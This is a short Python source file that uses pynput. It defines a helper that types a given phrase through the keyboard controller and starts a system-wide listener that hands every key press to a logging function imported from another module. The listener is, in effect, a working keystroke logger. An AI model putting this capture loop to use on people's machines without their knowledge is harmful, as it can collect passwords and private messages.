# imports
from main import append_to_log
from pynput.keyboard import Controller
from pynput.keyboard import Listener


# types out a string using the user's keyboard
def keyboard_control(typed_phrase):
    # create a variable called keyboard and set it to use the controller function
    keyboard = Controller()
    # type out the string
    keyboard.type(typed_phrase)


# listens for keyboard presses
# on press, run the 'append_to_log' function
with Listener(on_press=append_to_log) as key_l:
    # join the keys together(for formatting reasons)
    key_l.join()
